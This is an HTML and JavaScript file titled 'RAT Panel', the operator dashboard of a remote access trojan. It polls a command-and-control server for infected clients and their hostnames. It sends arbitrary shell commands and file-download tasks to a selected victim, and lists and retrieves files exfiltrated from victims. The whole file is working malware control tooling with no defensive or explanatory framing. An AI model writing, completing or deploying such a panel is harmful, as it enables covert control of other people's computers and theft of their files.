<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000000; color: rgb(255, 255, 255); font-family: sans-serif; padding: 15px; }
        .box { padding: 10px; margin-bottom: 10px; }
        button, input { background: #232323; color: #fff; border: 1px solid #555; padding: 5px; }
        #console { 
            background: #232323; 
            height: 400px; 
            overflow-y: scroll; 
            font-family: 'Courier New', monospace; 
            white-space: pre-wrap;
            word-wrap: break-word;
            padding: 10px;
        }
    </style>
    <title>RAT Panel</title>
</head>
<body>
    <div class="box">
        <h2>Active Clients</h2>
        <div id="clients"></div>
    </div>

    <div class="box">
        <h2>Task Control</h2>
        <input id="clientId" placeholder="Client ID" style="width: 450px;">
        <br><br>
        <input id="cmd" placeholder="Command" style="width: 450px;">
        <button onclick="send('cmd')">Execute</button>        
        <br><br>
        <input id="path" placeholder="File Path" style="width: 450px;">
        <button onclick="send('download')">Download</button>
    </div>
    <div class="box">
        <h2>Files</h2>
        <div id="files"></div>
        <button onclick="refreshFiles()">Refresh</button>
        <br><br>
    </div>
    <div class="box" style="background: #232323; height: 200px; overflow-y: scroll;" id="console">
        <div style="color: #555;">Command Output</div>
    </div>
    <script>
        const API_BASE = 'http://localhost:8081';

        async function refresh() {
            let res = await fetch(`${API_BASE}/api/clients`);
            let data = await res.json();
            document.getElementById('clients').innerHTML = data.map(a =>
                `<div><b>${a.id}</b> | ${a.hostname} | ${a.os} | Last seen: ${a.last_seen}
                <button onclick="document.getElementById('clientId').value='${a.id}'">Select</button></div>`
            ).join('');
        }

        async function send(type) {
            let id = document.getElementById('clientId').value;
            let cmd = document.getElementById('cmd').value;
            let path = document.getElementById('path').value;
            await fetch(`${API_BASE}/api/task?id=` + id, {
                method: 'POST',
                body: JSON.stringify({type, command: cmd, path})
            });
            alert("Task sent");
            document.getElementById('cmd').value = '';
            document.getElementById('path').value = '';
        }

        async function refreshFiles() {
            let res = await fetch(`${API_BASE}/api/uploads`);
            let files = await res.json();
            document.getElementById('files').innerHTML = files.map(f => 
                `<div>${f} <a href="#" onclick="window.open('${API_BASE}/download/${f}'); return false;" style="color:#51998e">[Download]</a></div>`
            ).join('');
        }

        async function refreshLogs() {
            let res = await fetch(`${API_BASE}/api/logs`);
            let logs = await res.json();
            document.getElementById('console').innerHTML = 
                '<div style="color: #555;">Command Output</div>' +
                logs.map(l => {
                    let escaped = l.replace(/&/g, '&amp;')
                                  .replace(/</g, '&lt;')
                                  .replace(/>/g, '&gt;');
                    return `<div style="margin-bottom: 15px; border-bottom: 1px solid #444; padding-bottom: 10px;">${escaped}</div>`;
                }).join('');
        }

        setInterval(refreshLogs, 3000);
        setInterval(refreshFiles, 6000);
        refreshFiles();
        setInterval(refresh, 3000);
        refresh();
    </script>
</body>
</html>
